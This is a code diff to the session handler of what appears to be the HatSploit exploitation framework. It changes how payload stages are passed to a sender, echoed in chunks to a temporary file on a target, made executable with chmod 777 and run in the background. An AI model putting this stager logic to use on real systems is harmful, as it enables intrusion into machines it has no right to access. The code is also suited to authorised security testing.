@@ -61,7 +61,7 @@ class Handler(TCP):
             self.badges.output_error("Failed to handle session!")
             return None
 
-    def echo_stage(self, payload, sender, args=None, location='/tmp', encode=False):
+    def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
@@ -82,16 +82,16 @@ class Handler(TCP):
             command = echo_stream.format(block, path)
 
             if encode:
-                sender((command + '\n').encode())
+                sender(*args, (command + '\n').encode())
             else:
-                sender(command)
+                sender(*args, command)
 
         args = args if args is not None else ""
 
         if encode:
-            sender(f"chmod 777 {path}; sh -c '{path} {args}' 2>/dev/null &\n".encode())
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
-            sender(f"chmod 777 {path}; sh -c '{path} {args}' 2>/dev/null &")
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
@@ -100,7 +100,7 @@ class Handler(TCP):
         session.details['Platform'] = payload['Platform']
         return session
 
-    def handle_session(self, host, port, payload, sender=None, location='/tmp', timeout=None, method=None):
+    def handle_session(self, host, port, payload, sender=None, args=[], location='/tmp', timeout=None, method=None):
         if payload['Payload'] is None:
             self.badges.output_error("Payload stage is not found!")
             return False
@@ -108,9 +108,9 @@ class Handler(TCP):
         if sender is not None:
             session = payload['Session'] if payload['Session'] is not None else HatSploitSession
             if payload['Category'].lower() == 'stager':
-                self.echo_stage(payload['Payload'], sender, payload['Args'], location)
+                self.echo_stage(payload['Payload'], sender, args, payload['Args'], location)
             elif payload['Category'].lower() == 'single':
-                sender(payload['Payload'])
+                sender(*args, payload['Payload'])
             else:
                 self.badges.output_error("Invalid payload category!")
                 return False
@@ -128,7 +128,7 @@ class Handler(TCP):
                         return False
 
                 if payload['Category'].lower() == 'stager':
-                    self.echo_stage(payload['Payload'], new_session.send, payload['Args'], location, encode=True)
+                    self.echo_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
                 elif payload['Category'].lower() == 'single':
                     new_session.send_command(payload['Payload'])
                 else:
